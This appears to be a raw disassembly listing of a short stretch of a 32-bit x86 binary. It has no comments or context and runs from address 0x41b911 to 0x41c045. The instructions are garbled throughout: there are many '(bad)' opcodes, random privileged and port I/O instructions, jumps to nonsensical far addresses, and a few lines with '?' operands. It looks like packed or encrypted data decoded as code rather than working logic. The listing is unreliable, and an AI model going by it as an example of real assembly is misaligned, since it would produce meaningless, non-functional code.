  41b911:	popf   
  41b912:	cmp    ebx,DWORD PTR [esi+ebx*4-0x29]
  41b916:	sub    BYTE PTR [ebp+0x559e9ccb],dl
  41b91c:	cmp    DWORD PTR [ecx],edi
  41b91e:	cmp    DWORD PTR [esi+0x51],eax
  41b921:	adc    al,0x16
  41b923:	xchg   edi,eax
  41b924:	xchg   esi,eax
  41b925:	mov    BYTE PTR [edi],ah
  41b927:	loop   0x41b8dd
  41b929:	pop    ebx
  41b92a:	sub    eax,0x5304c912
  41b92f:	push   ebp
  41b930:	mov    ds:0x6ad16ad9,eax
  41b935:	or     BYTE PTR ss:[esp+edx*1],al
  41b939:	xor    al,0x3b
  41b93b:	and    al,0x9f
  41b93d:	dec    esi
  41b93e:	and    eax,0xcb9fbf64
  41b943:	pop    edx
  41b944:	popf   
  41b945:	xchg   ebx,eax
  41b946:	jecxz  0x41b9ab
  41b948:	inc    edx
  41b949:	loope  0x41b95b
  41b94b:	icebp  
  41b94c:	js     0x41b8e0
  41b94e:	ins    BYTE PTR es:[edi],dx
  41b94f:	mov    ebp,DWORD PTR ss:[esi-0x34356b55]
  41b956:	je     0x41b992
  41b958:	pop    ebp
  41b959:	dec    esi
  41b95a:	dec    edi
  41b95b:	iret   
  41b95c:	mov    eax,0x2a52af38
  41b961:	xchg   edi,eax
  41b962:	fstp   DWORD PTR [eax-0x21]
  41b965:	loopne 0x41b94c
  41b967:	xchg   edi,eax
  41b968:	pop    edi
  41b969:	inc    ecx
  41b96a:	xchg   edx,eax
  41b96b:	fs loop 0x41b937
  41b96e:	and    al,0x7f
  41b970:	cld    
  41b971:	xchg   DWORD PTR [edi+0x48],edi
  41b974:	stos   DWORD PTR es:[edi],eax
  41b975:	aad    0x64
  41b977:	xor    bl,BYTE PTR [ecx+0x187c57e0]
  41b97d:	xchg   cl,ah
  41b97f:	xchg   esi,eax
  41b980:	dec    ebp
  41b981:	adc    eax,0x58b8a145
  41b986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b987:	push   eax
  41b988:	pop    eax
  41b989:	and    BYTE PTR [ebp-0x60250fb6],dl
  41b98f:	mov    esi,0x43dfb0c6
  41b994:	xchg   edx,eax
  41b995:	inc    esp
  41b996:	je     0x41b9e5
  41b998:	mov    ds:0xad516add,eax
  41b99d:	push   esp
  41b99e:	pop    ecx
  41b99f:	pop    esp
  41b9a0:	pop    edx
  41b9a1:	in     al,0xf6
  41b9a3:	popf   
  41b9a4:	addr16 call 0xe266751f
  41b9aa:	jno    0x41b966
  41b9ac:	in     eax,dx
  41b9ad:	ss xchg ecx,eax
  41b9af:	jo     0x41b935
  41b9b1:	cmc    
  41b9b2:	lea    ecx,ds:0xbb14c992
  41b9b8:	cmp    ecx,DWORD PTR [edi+0x66]
  41b9bb:	mov    eax,0xc9c23843
  41b9c0:	leave  
  41b9c1:	xor    ebp,edi
  41b9c3:	pop    esi
  41b9c4:	lahf   
  41b9c5:	ins    BYTE PTR es:[edi],dx
  41b9c6:	cs dec ebx
  41b9c8:	in     eax,0xec
  41b9ca:	xchg   esp,eax
  41b9cb:	pop    edx
  41b9cc:	lods   eax,DWORD PTR ds:[esi]
  41b9cd:	dec    esi
  41b9ce:	and    bl,BYTE PTR [ecx-0x5e50aa5c]
  41b9d4:	test   eax,0x2bcbca53
  41b9d9:	dec    esp
  41b9da:	(bad)  
  41b9db:	arpl   dx,di
  41b9dd:	add    DWORD PTR [ecx],0x3
  41b9e0:	sub    edi,DWORD PTR [esi+0x3fb2b234]
  41b9e6:	sahf   
  41b9e7:	jmp    0x54dd:0xcb2530d4
  41b9ee:	sub    al,0x4b
  41b9f0:	mov    bl,0x30
  41b9f2:	pop    eax
  41b9f3:	push   ss
  41b9f4:	xor    eax,0x7b369184
  41b9f9:	fcomp  QWORD PTR [esi-0x1fa5db84]
  41b9ff:	mov    bl,0xc7
  41ba01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba02:	mov    ebp,DWORD PTR [edx+0x1f]
  41ba05:	outs   dx,BYTE PTR ds:[si]
  41ba07:	mov    ah,BYTE PTR [ebp-0x6c972f80]
  41ba0d:	loop   0x41ba86
  41ba0f:	xor    BYTE PTR [edi+ebx*8-0x1b],ah
  41ba13:	out    dx,eax
  41ba14:	jmp    edi
  41ba16:	test   edi,ebx
  41ba18:	push   esp
  41ba19:	sar    edi,1
  41ba1b:	(bad)  
  41ba1c:	dec    DWORD PTR [bx-0x8ba]
  41ba21:	fst    st(4)
  41ba23:	lea    esi,[edi+0x14b9ef22]
  41ba29:	loopne 0x41b9da
  41ba2b:	cmp    al,0x3b
  41ba2d:	std    
  41ba2e:	aad    0xe0
  41ba30:	stc    
  41ba31:	xchg   edi,eax
  41ba32:	(bad)  
  41ba33:	stos   BYTE PTR es:[edi],al
  41ba34:	in     al,0x9b
  41ba36:	and    al,0x5
  41ba38:	cdq    
  41ba39:	stc    
  41ba3a:	and    cl,BYTE PTR [ebx-0x6f]
  41ba3d:	sub    eax,DWORD PTR [ebx+0x7e670d33]
  41ba43:	cmp    eax,0x9c372533
  41ba48:	imul   edi,DWORD PTR [eax+0x4ee73d82],0x14d6bf98
  41ba52:	shl    DWORD PTR [edi-0x3f],0xae
  41ba56:	jg     0x41b9f1
  41ba58:	(bad)  
  41ba59:	rcl    DWORD PTR [edi],1
  41ba5b:	or     DWORD PTR [ebx+0x16],ecx
  41ba5e:	mov    ebp,0xe2e28f4e
  41ba63:	and    al,bl
  41ba65:	rol    DWORD PTR [eax-0x1d3fd7b0],0xe2
  41ba6c:	adc    al,bl
  41ba6e:	inc    ecx
  41ba6f:	pop    ds
  41ba70:	lds    ebx,FWORD PTR [edi]
  41ba72:	and    BYTE PTR [ebx-0xec53133],dl
  41ba78:	je     0x41ba17
  41ba7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba7b:	repnz xor ch,dl
  41ba7e:	fs int3 
  41ba80:	rcl    ecx,1
  41ba82:	adc    DWORD PTR [edx+0x66cd932c],esi
  41ba88:	cmp    DWORD PTR [esi],edi
  41ba8a:	cmp    ah,ah
  41ba8c:	in     al,dx
  41ba8d:	mov    ah,0x82
  41ba8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba90:	stos   BYTE PTR es:[edi],al
  41ba91:	sub    BYTE PTR [ecx-0x70a14300],al
  41ba97:	icebp  
  41ba98:	je     0x41bae6
  41ba9a:	test   eax,0x54a96654
  41ba9f:	inc    esi
  41baa0:	xchg   esi,eax
  41baa1:	xor    dh,BYTE PTR gs:[esi]
  41baa4:	pop    edx
  41baa5:	cmp    eax,0xa5664f1d
  41baaa:	mov    edi,0xa3a38a54
  41baaf:	inc    ebx
  41bab0:	imul   edx,DWORD PTR cs:[edi-0x359cb9b4],0x2b
  41bab8:	sub    esp,DWORD PTR [edx+edx*1-0x56bbf24d]
  41babf:	je     0x41ba5b
  41bac1:	icebp  
  41bac2:	js     0x41ba90
  41bac4:	jmp    0x6edbe4a2
  41bac9:	adc    BYTE PTR [eax],cl
  41bacb:	add    al,0xb8
  41bacd:	cmp    BYTE PTR [edi-0x6e8a142e],ch
  41bad3:	gs pop ds
  41bad5:	aaa    
  41bad6:	outs   dx,DWORD PTR ds:[esi]
  41bad7:	frstor [ecx+edx*1]
  41bada:	dec    edi
  41badb:	adc    BYTE PTR [ebx+0x162e2945],cl
  41bae1:	test   eax,0xe4f39f9e
  41bae6:	icebp  
  41bae7:	ss int 0x56
  41baea:	sub    DWORD PTR [esi+eiz*1-0x35],0xffffff8d
  41baef:	sbb    ebx,DWORD PTR [ebx+0x36512244]
  41baf5:	xlat   BYTE PTR ds:[ebx]
  41baf6:	xlat   BYTE PTR ds:[ebx]
  41baf7:	mov    al,0x10
  41baf9:	js     0x41bae8
  41bafb:	mov    ch,0xd7
  41bafd:	cmp    BYTE PTR ds:0x1c30653d,bh
  41bb03:	mov    cl,0xb5
  41bb05:	mov    ecx,0x259b364e
  41bb0a:	pop    edi
  41bb0b:	enter  0x52b3,0x5e
  41bb0f:	addr16 addr16 xchg di,ax
  41bb13:	fstp   st(5)
  41bb15:	pop    ebp
  41bb16:	cs into 
  41bb18:	das    
  41bb19:	sub    BYTE PTR [esi],dl
  41bb1b:	mov    ebp,DWORD PTR [esp+ebp*2-0x52]
  41bb1f:	adc    ecx,DWORD PTR [ebx-0x68d6a63a]
  41bb25:	shl    DWORD PTR [edx*4+0x31eef7fb],1
  41bb2c:	sahf   
  41bb2d:	dec    esp
  41bb2e:	push   eax
  41bb2f:	adc    al,0x85
  41bb31:	cmc    
  41bb32:	cmc    
  41bb33:	xor    eax,0x8611c306
  41bb38:	cmp    DWORD PTR [ebx],esp
  41bb3a:	lock mov WORD PTR [esi+0x65555443],es
  41bb41:	ins    DWORD PTR es:[edi],dx
  41bb42:	ins    DWORD PTR es:[edi],dx
  41bb43:	sbb    eax,0xf47934c3
  41bb48:	lock add edi,eax
  41bb4b:	(bad)  
  41bb4c:	daa    
  41bb4d:	mov    BYTE PTR [edx-0x48647240],al
  41bb53:	mov    DWORD PTR [ebx+eax*2+0x44418304],eax
  41bb5a:	push   ecx
  41bb5b:	mov    ds:0x596068d1,al
  41bb60:	push   ss
  41bb61:	sbb    ebx,DWORD PTR [ebx+0x43870c5b]
  41bb67:	push   ds
  41bb68:	aas    
  41bb69:	jle    0x41bbaf
  41bb6b:	mov    ebp,0xc402e33e
  41bb70:	mov    ds:0x8e8f0e31,al
  41bb75:	push   0x73645ab7
  41bb7a:	cmp    DWORD PTR [edx],esi
  41bb7c:	jmp    0x4aa9c8d
  41bb81:	push   ebp
  41bb82:	popf   
  41bb83:	bound  ebx,QWORD PTR [eax]
  41bb85:	push   es
  41bb86:	mov    ecx,0xf2f28e5c
  41bb8b:	or     cl,ch
  41bb8d:	push   esi
  41bb8e:	xor    ecx,0x68
  41bb91:	int3   
  41bb92:	mov    bl,0xcf
  41bb94:	ds retf 
  41bb96:	pusha  
  41bb97:	cmp    BYTE PTR [ebp+edx*8+0x75b5b06c],ah
  41bb9e:	add    edx,DWORD PTR [ecx-0x6a]
  41bba1:	sbb    BYTE PTR [esi],cl
  41bba3:	xchg   DWORD PTR [esi+edx*1],ebp
  41bba6:	pop    ss
  41bba7:	shl    DWORD PTR [ebp+edx*1+0x5d],1
  41bbab:	shr    eax,cl
  41bbad:	test   eax,0x8b69fe26
  41bbb2:	dec    esp
  41bbb3:	mov    ebx,0x14cf2182
  41bbb8:	fistp  QWORD PTR [ebx]
  41bbba:	push   ebp
  41bbbb:	fstp   DWORD PTR [ecx-0x3f]
  41bbbe:	es dec ecx
  41bbc0:	not    BYTE PTR [esi+0xe8ec162]
  41bbc6:	in     al,dx
  41bbc7:	push   ecx
  41bbc8:	push   0xffffff92
  41bbca:	xor    al,0x1f
  41bbcc:	sahf   
  41bbcd:	sub    cl,BYTE PTR [edx]
  41bbcf:	mov    bl,0x49
  41bbd1:	(bad)  
  41bbd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd3:	add    BYTE PTR [esi],bh
  41bbd5:	ror    DWORD PTR [esp+eax*2+0xd9783a7],1
  41bbdc:	popf   
  41bbdd:	xchg   edi,eax
  41bbde:	pop    esi
  41bbdf:	stc    
  41bbe0:	mov    eax,ds:0xdf8dfe1f
  41bbe5:	cli    
  41bbe6:	jecxz  0x41bc2f
  41bbe8:	cli    
  41bbe9:	jg     0x41bc43
  41bbeb:	lea    edi,[eax+0x7b]
  41bbee:	repnz sahf 
  41bbf0:	xor    al,BYTE PTR [eax]
  41bbf2:	movd   ecx,mm6
  41bbf5:	jecxz  0x41bb96
  41bbf7:	dec    edx
  41bbf8:	push   esi
  41bbf9:	(bad)  
  41bbfa:	clc    
  41bbfb:	push   edi
  41bbfc:	in     al,0xe8
  41bbfe:	in     al,dx
  41bbff:	ja     0x41bbf0
  41bc01:	dec    esp
  41bc02:	cmp    esp,DWORD PTR [edi+0x70]
  41bc05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc06:	mov    bl,0x74
  41bc08:	ret    0x5119
  41bc0b:	ins    DWORD PTR es:[edi],dx
  41bc0c:	call   0x9656c1af
  41bc11:	mov    ebp,0xcf9acf7f
  41bc16:	fnsave [edi-0x4a]
  41bc19:	in     eax,0x48
  41bc1b:	sub    bh,ah
  41bc1d:	sti    
  41bc1e:	lock or esi,esp
  41bc21:	arpl   WORD PTR [ebx-0x5c],bp
  41bc24:	adc    edx,DWORD PTR [ecx]
  41bc26:	call   0x4d18:0x48e126cd
  41bc2d:	push   ebp
  41bc2e:	imul   esi,DWORD PTR ds:0xaeaf2ceb,0xa8b769d1
  41bc38:	xlat   BYTE PTR ds:[ebx]
  41bc39:	jmp    0x41bc1f
  41bc3b:	repz jns 0x41bc64
  41bc3e:	shr    DWORD PTR [ecx],cl
  41bc40:	jnp    0x41bcbd
  41bc42:	jnp    0x41bbc8
  41bc44:	add    BYTE PTR [ecx-0x3e],0x91
  41bc48:	or     BYTE PTR [edi+0x7],al
  41bc4b:	sti    
  41bc4c:	hlt    
  41bc4d:	jp     0x41bccc
  41bc4f:	mov    bh,0x71
  41bc51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc52:	fucomip st,st(7)
  41bc54:	and    ecx,DWORD PTR [ecx+0x12]
  41bc57:	fwait
  41bc58:	pop    ebx
  41bc59:	aaa    
  41bc5a:	lock sti 
  41bc5c:	cld    
  41bc5d:	enter  0x4cb2,0x28
  41bc61:	sbb    al,0x46
  41bc63:	xchg   edx,eax
  41bc64:	inc    esp
  41bc65:	fs dec ecx
  41bc67:	and    bh,BYTE PTR [edi-0x14285bb0]
  41bc6d:	icebp  
  41bc6e:	lock loope 0x41bc74
  41bc71:	cli    
  41bc72:	std    
  41bc73:	push   ds
  41bc74:	jle    0x41bc35
  41bc76:	pop    ds
  41bc77:	lds    ebp,FWORD PTR [edi+0x977e830]
  41bc7d:	add    al,0x82
  41bc7f:	in     al,0xf2
  41bc81:	jns    0x41bcc5
  41bc83:	mov    eax,ds:0xc8204a30
  41bc88:	inc    edx
  41bc89:	jno    0x41bc0c
  41bc8b:	push   0xffffffe5
  41bc8d:	mov    WORD PTR [edi],?
  41bc8f:	fistp  QWORD PTR [eax-0x7d]
  41bc92:	push   esi
  41bc93:	mov    bl,0x45
  41bc95:	cmp    al,0x9e
  41bc97:	pusha  
  41bc98:	test   eax,0x1600425c
  41bc9d:	xchg   edi,eax
  41bc9e:	dec    edx
  41bc9f:	call   0x5ae7033e
  41bca4:	mov    eax,ds:0xdf8e7e7a
  41bca9:	scas   eax,DWORD PTR es:[edi]
  41bcaa:	mov    al,ds:0x5edd1aaa
  41bcaf:	sqrtps xmm2,XMMWORD PTR [ecx+ecx*8]
  41bcb3:	out    0xf3,eax
  41bcb5:	inc    esp
  41bcb6:	ret    0x7a61
  41bcb9:	std    
  41bcba:	mov    esi,0x6714a65d
  41bcbf:	xchg   ebx,eax
  41bcc0:	mov    eax,esi
  41bcc2:	arpl   WORD PTR [edx-0x4f],sp
  41bcc5:	sbb    BYTE PTR [ebx-0x75],cl
  41bcc8:	dec    ebx
  41bcc9:	call   0x6aec4b88
  41bcce:	inc    esp
  41bccf:	and    dl,BYTE PTR [ecx]
  41bcd1:	(bad)  
  41bcd3:	push   ss
  41bcd4:	xchg   edi,eax
  41bcd5:	pop    ss
  41bcd6:	xor    eax,0x9256edb7
  41bcdb:	inc    esp
  41bcdc:	dec    esi
  41bcdd:	mov    cs,WORD PTR [edi+0x66]
  41bce0:	pop    ebp
  41bce1:	jge    0x41bcd9
  41bce3:	sar    BYTE PTR [edi-0x41],0xa2
  41bce7:	push   eax
  41bce8:	sub    dl,BYTE PTR [ebp+0x3c7b74e8]
  41bcee:	mov    esp,0xd9ea9f7f
  41bcf3:	sbb    ecx,edx
  41bcf5:	js     0x41bc8b
  41bcf7:	xchg   ebp,eax
  41bcf8:	xchg   ebp,eax
  41bcf9:	push   ebp
  41bcfa:	loop   0x41bced
  41bcfc:	cmp    BYTE PTR [ebx],ch
  41bcfe:	stos   DWORD PTR es:[edi],eax
  41bcff:	stos   DWORD PTR es:[edi],eax
  41bd00:	pop    eax
  41bd01:	xchg   esi,eax
  41bd02:	leave  
  41bd03:	ret    
  41bd04:	sti    
  41bd05:	div    DWORD PTR [eax+0x3c78812c]
  41bd0b:	dec    esi
  41bd0c:	xor    BYTE PTR [eax],bl
  41bd0e:	pusha  
  41bd0f:	ja     0x41bd88
  41bd11:	xchg   edx,ecx
  41bd13:	fldcw  WORD PTR [ecx]
  41bd15:	mov    ah,BYTE PTR [edx+0x132f2e50]
  41bd1b:	(bad)  
  41bd1c:	iret   
  41bd1d:	sub    dh,cl
  41bd1f:	shr    ecx,cl
  41bd21:	test   BYTE PTR [ebx-0x6e5d9c5d],ah
  41bd27:	or     cl,bl
  41bd29:	ins    BYTE PTR es:[edi],dx
  41bd2a:	mov    ss,ebx
  41bd2c:	xchg   ebx,eax
  41bd2d:	adc    esi,esi
  41bd2f:	div    edi
  41bd31:	mov    cl,0x4c
  41bd33:	xchg   ebx,eax
  41bd34:	in     eax,0xd5
  41bd36:	adc    eax,0xa73a8d1a
  41bd3b:	daa    
  41bd3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3d:	clc    
  41bd3e:	jl     0x41bd7e
  41bd40:	xchg   esi,eax
  41bd41:	dec    edx
  41bd42:	and    eax,0x9d475d0c
  41bd47:	dec    esi
  41bd48:	icebp  
  41bd49:	sti    
  41bd4a:	adc    eax,0xb118f1e2
  41bd4f:	js     0x41bcdd
  41bd51:	icebp  
  41bd52:	push   0x90c79b34
  41bd57:	leave  
  41bd58:	xor    BYTE PTR [esi],bl
  41bd5a:	lea    esp,[esi+0x3]
  41bd5d:	inc    edx
  41bd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd5f:	rcr    ecx,cl
  41bd61:	nop
  41bd62:	(bad)  
  41bd63:	jp     0x41bd82
  41bd65:	push   ebp
  41bd66:	aad    0x41
  41bd68:	xchg   esi,eax
  41bd69:	enter  0x1ed5,0xb8
  41bd6d:	adc    edx,DWORD PTR [eax+0x65a15b25]
  41bd73:	shl    DWORD PTR [esi+0x10],1
  41bd76:	mul    BYTE PTR [ebx-0x32]
  41bd79:	pop    esi
  41bd7a:	push   es
  41bd7b:	addr16 retf 
  41bd7d:	mov    bl,0xe4
  41bd7f:	sub    al,0x4b
  41bd81:	mov    cl,0xc5
  41bd83:	pop    ecx
  41bd84:	(bad)  
  41bd85:	loop   0x41bda1
  41bd87:	or     DWORD PTR [ecx],ecx
  41bd89:	adc    al,0x4d
  41bd8b:	pop    ebx
  41bd8c:	jmp    0x41bde9
  41bd8e:	mov    esi,0x7ebe6fc6
  41bd93:	stc    
  41bd94:	(bad)
  41bd97:	push   es
  41bd98:	mov    esp,0x329ef2f3
  41bd9d:	add    BYTE PTR [edi],bh
  41bd9f:	cmc    
  41bda0:	and    bh,BYTE PTR [edi+0x3675f31a]
  41bda6:	dec    ebp
  41bda7:	sti    
  41bda8:	lods   al,BYTE PTR ds:[esi]
  41bda9:	popf   
  41bdaa:	gs sbb esi,ecx
  41bdad:	jmp    0x1763:0x38d9c16c
  41bdb4:	jnp    0x41bdc2
  41bdb6:	int    0x36
  41bdb8:	or     BYTE PTR [esi-0x26316c43],al
  41bdbe:	inc    eax
  41bdbf:	imul   esp,edi,0xffffffff
  41bdc2:	xchg   BYTE PTR [ebx+0x18],ah
  41bdc5:	or     al,0x98
  41bdc7:	and    bl,dh
  41bdc9:	pop    es
  41bdca:	loope  0x41bddb
  41bdcc:	adc    cl,BYTE PTR [ecx-0x1a]
  41bdcf:	leave  
  41bdd0:	fs push edx
  41bdd2:	dec    esp
  41bdd3:	(bad)  
  41bdd4:	arpl   WORD PTR [ebp+ecx*2+0x43],si
  41bdd8:	or     DWORD PTR [eax],ebp
  41bdda:	or     al,0x87
  41bddc:	std    
  41bddd:	sbb    DWORD PTR [eax],edi
  41bddf:	data16 sbb BYTE PTR [esi+edx*8+0x2e],bl
  41bde4:	adc    DWORD PTR [ecx+edx*1+0x59],eax
  41bde8:	xchg   edx,eax
  41bde9:	imul   edx,esi,0x23468c1b
  41bdef:	adc    cl,BYTE PTR [ecx-0x2e5965fc]
  41bdf5:	jmp    0x41bdec
  41bdf7:	sub    BYTE PTR [esp+edx*1],ch
  41bdfa:	sub    DWORD PTR [edi-0x6efd429a],edx
  41be00:	push   0x1b86d674
  41be05:	mov    DWORD PTR [eax-0x7f758b2],edx
  41be0b:	adc    eax,0x687676f6
  41be10:	xor    al,0x6b
  41be12:	clc    
  41be13:	gs pop ds
  41be15:	xchg   esi,eax
  41be16:	shr    DWORD PTR gs:[eax+0x478f18d5],1
  41be1d:	in     al,0xb3
  41be1f:	cmp    edx,ecx
  41be21:	sub    ebp,DWORD PTR [ebx]
  41be23:	inc    esp
  41be24:	and    dl,BYTE PTR [ecx+0x16]
  41be27:	mov    ecx,DWORD PTR [ebx+0x4e53a74c]
  41be2d:	dec    esi
  41be2e:	mov    gs,WORD PTR [ecx+0x36]
  41be31:	addr16 in eax,0x45
  41be34:	push   ebp
  41be35:	push   ebp
  41be36:	addr16 sub eax,0x52c19ac5
  41be3c:	test   eax,0x88b162c4
  41be41:	mov    ds:0x152d2c28,al
  41be46:	xor    DWORD PTR ds:0xf97f2f93,ecx
  41be4c:	xor    eax,0x20068d5a
  41be51:	jo     0x41be3a
  41be53:	into   
  41be54:	ins    DWORD PTR es:[edi],dx
  41be55:	bound  esi,QWORD PTR [ecx+0x25a5a518]
  41be5b:	shr    cl,cl
  41be5d:	adc    al,0x8f
  41be5f:	mov    bh,0xb7
  41be61:	jns    0x41be15
  41be63:	std    
  41be64:	test   BYTE PTR [edx-0x43],bh
  41be67:	dec    esi
  41be68:	sub    dl,BYTE PTR [ebp+0x30b8a166]
  41be6e:	repz loopne 0x41be8c
  41be71:	imul   esi,DWORD PTR [edx+edi*1+0x5d],0xffffffee
  41be76:	fistp  QWORD PTR [edi-0x40]
  41be79:	leave  
  41be7a:	leave  
  41be7b:	xor    DWORD PTR [eax],ecx
  41be7d:	add    ch,BYTE PTR [ebx]
  41be7f:	sub    ebp,DWORD PTR [ebx]
  41be81:	inc    esp
  41be82:	and    edx,DWORD PTR [ecx]
  41be84:	xchg   esi,eax
  41be85:	retf   
  41be86:	retf   
  41be87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be88:	shr    BYTE PTR [ecx],cl
  41be8a:	push   ds
  41be8b:	ds js  0x41be4e
  41be8e:	loope  0x41be61
  41be90:	and    DWORD PTR [ebp-0x325260a2],edi
  41be96:	or     eax,0x48161616
  41be9b:	and    al,0x92
  41be9d:	sub    al,0x97
  41be9f:	retf   
  41bea0:	xor    al,0x1a
  41bea2:	sub    eax,0xd076f776
  41bea7:	je     0x41be46
  41bea9:	inc    edx
  41beaa:	popa   
  41beab:	cmp    DWORD PTR [eax+0x3c],0x29d9d9ce
  41beb2:	xchg   BYTE PTR [esi-0x7ef9e45d],ch
  41beb8:	inc    eax
  41beb9:	nop
  41beba:	dec    eax
  41bebb:	and    al,0xcc
  41bebd:	out    0xd6,al
  41bebf:	(bad)  
  41bec0:	fldcw  WORD PTR [eax-0x51]
  41bec3:	popf   
  41bec4:	sbb    eax,0xd81fdfa
  41bec9:	and    al,0xa6
  41becb:	mov    eax,0x33473f38
  41bed0:	data16 jmp 0x41be90
  41bed3:	mov    ds:0xf2a508d1,eax
  41bed8:	xor    al,ch
  41beda:	test   DWORD PTR [edx],esp
  41bedc:	(bad)  
  41bedd:	pop    ds
  41bede:	cmp    eax,0xb21a3862
  41bee3:	mov    al,0x58
  41bee5:	fs stos BYTE PTR es:[edi],al
  41bee7:	stos   BYTE PTR es:[edi],al
  41bee8:	in     al,dx
  41bee9:	ds jns 0x41bf2e
  41beec:	mov    ebx,0x2f9f24d5
  41bef1:	pusha  
  41bef2:	pop    edx
  41bef3:	push   ss
  41bef4:	fcmovnu st,st(3)
  41bef6:	fisttp DWORD PTR [eax]
  41bef8:	add    BYTE PTR [eax-0x4f],0x58
  41befc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41befd:	shr    DWORD PTR [esi-0x2f],cl
  41bf00:	jmp    0xf4278879
  41bf05:	add    BYTE PTR [edi+ebx*4-0x1a306c61],bl
  41bf0c:	cdq    
  41bf0d:	push   0x53
  41bf0f:	stos   BYTE PTR es:[edi],al
  41bf10:	out    0xe7,eax
  41bf12:	test   bl,al
  41bf14:	popa   
  41bf15:	dec    esi
  41bf16:	mov    cs,WORD PTR [edi+0x68e3c649]
  41bf1c:	dec    edx
  41bf1d:	test   al,bh
  41bf1f:	lds    edi,FWORD PTR [ebp+0x2]
  41bf22:	cli    
  41bf23:	hlt    
  41bf24:	retf   0x2556
  41bf27:	addr16 fwait
  41bf29:	xchg   ecx,eax
  41bf2a:	test   BYTE PTR ds:0x2063d91c,bh
  41bf30:	fdiv   QWORD PTR [ecx]
  41bf32:	out    0xf6,eax
  41bf34:	jecxz  0x41bed8
  41bf36:	cmp    BYTE PTR [edi-0x11],bl
  41bf39:	out    0x46,al
  41bf3b:	bswap  esi
  41bf3d:	jmp    0x41bf86
  41bf3f:	std    
  41bf40:	sbb    ebx,DWORD PTR [edi]
  41bf42:	stc    
  41bf43:	(bad)  
  41bf44:	jg     0x41bf2a
  41bf46:	xlat   BYTE PTR ds:[ebx]
  41bf47:	(bad)  
  41bf48:	out    dx,eax
  41bf49:	aas    
  41bf4a:	jl     0x41bf80
  41bf4c:	std    
  41bf4d:	dec    esi
  41bf4e:	jmp    0x41bf12
  41bf50:	cmp    esp,DWORD PTR ds:0xe00c19ef
  41bf56:	fisubr WORD PTR [edi-0x6e4c1704]
  41bf5c:	popf   
  41bf5d:	jg     0x41bf5d
  41bf5f:	imul   ebp,DWORD PTR [ebx],0x17a88f66
  41bf65:	in     al,dx
  41bf66:	popf   
  41bf67:	jae    0x41bfa3
  41bf69:	mov    bl,0x30
  41bf6b:	int    0xe
  41bf6d:	mov    esp,0x8ed7d5dc
  41bf72:	out    0x37,eax
  41bf74:	in     eax,dx
  41bf75:	and    eax,0x6af8f61b
  41bf7a:	shl    DWORD PTR [esi+eiz*2+0x0],cl
  41bf7e:	cmp    al,0x38
  41bf80:	and    BYTE PTR [eax+0x41],0xc3
  41bf84:	xchg   edi,eax
  41bf85:	mov    ds:0xfb48c42d,al
  41bf8a:	add    al,0x4
  41bf8c:	shl    DWORD PTR [edx],cl
  41bf8e:	cdq    
  41bf8f:	dec    esp
  41bf90:	popa   
  41bf91:	pop    ecx
  41bf92:	push   eax
  41bf93:	cs xchg edi,eax
  41bf95:	rcl    esp,1
  41bf97:	or     DWORD PTR [edx+0x142851a6],ebx
  41bf9d:	test   al,0xd7
  41bf9f:	fwait
  41bfa0:	or     al,0xfb
  41bfa2:	add    edx,DWORD PTR [esi+0x4a]
  41bfa5:	gs mov edx,0xdefd0edd
  41bfab:	sub    BYTE PTR [eax+0x34],0xc6
  41bfaf:	retf   0x1f8a
  41bfb2:	inc    ebp
  41bfb3:	or     DWORD PTR [eax+0x1a],esp
  41bfb6:	es es fcom st(3)
  41bfba:	imul   esp,ebx,0xffffffd4
  41bfbd:	imul   esi,DWORD PTR [ebp-0x32],0xffffffce
  41bfc1:	into   
  41bfc2:	pop    eax
  41bfc3:	pop    esp
  41bfc4:	pop    esp
  41bfc5:	and    al,0x97
  41bfc7:	sub    esi,DWORD PTR [eax]
  41bfc9:	sahf   
  41bfca:	dec    esi
  41bfcb:	call   0x4addfac5
  41bfd0:	(bad)  
  41bfd1:	cmp    al,0xfb
  41bfd3:	cld    
  41bfd4:	rep lods al,BYTE PTR ds:[esi]
  41bfd6:	outs   dx,DWORD PTR ds:[esi]
  41bfd7:	outs   dx,BYTE PTR ds:[esi]
  41bfd8:	shr    bl,cl
  41bfda:	jbe    0x41bfed
  41bfdc:	mov    DWORD PTR gs:[esi-0x49],ebp
  41bfe0:	mov    esp,DWORD PTR [ecx+0x1a]
  41bfe3:	sub    cl,al
  41bfe5:	add    BYTE PTR [edx+0x5dab5028],al
  41bfeb:	mov    ds:0xc96453aa,al
  41bff0:	(bad)  
  41bff1:	in     eax,dx
  41bff2:	cmp    esi,DWORD PTR [edi-0x30]
  41bff5:	or     eax,0x8b4cb03
  41bffa:	add    al,0x14
  41bffc:	push   ds
  41bffd:	cmp    eax,0xc5c5c47a
  41c002:	cmp    DWORD PTR [ebx+0x7e28ebab],ebp
  41c008:	pop    ds
  41c009:	ror    DWORD PTR [eax-0x6c],1
  41c00c:	mov    gs,WORD PTR [esi+0x20]
  41c00f:	or     dl,al
  41c011:	mov    eax,?
  41c013:	and    ecx,DWORD PTR [ebx-0x38]
  41c016:	mov    dl,0xcf
  41c018:	outs   dx,BYTE PTR ds:[esi]
  41c019:	add    al,0x9a
  41c01b:	xor    BYTE PTR [esi],bl
  41c01d:	pop    ecx
  41c01f:	mov    dl,0x90
  41c021:	fs cdq 
  41c023:	dec    esp
  41c024:	sub    dh,BYTE PTR [ecx]
  41c026:	fld    TBYTE PTR [ebp-0x70]
  41c029:	dec    esi
  41c02a:	jae    0x41c062
  41c02c:	lods   eax,DWORD PTR ds:[esi]
  41c02d:	shr    dh,cl
  41c02f:	mov    ah,0xd0
  41c031:	push   esp
  41c032:	(bad)  
  41c033:	leave  
  41c034:	fs inc edx
  41c036:	cmp    al,0x1a
  41c038:	inc    ebp
  41c039:	int    0x64
  41c03b:	lock sti 
  41c03d:	adc    eax,0xaa645924
  41c042:	stos   BYTE PTR es:[edi],al
  41c043:	mov    bl,0xf2
  41c045:	lahf   
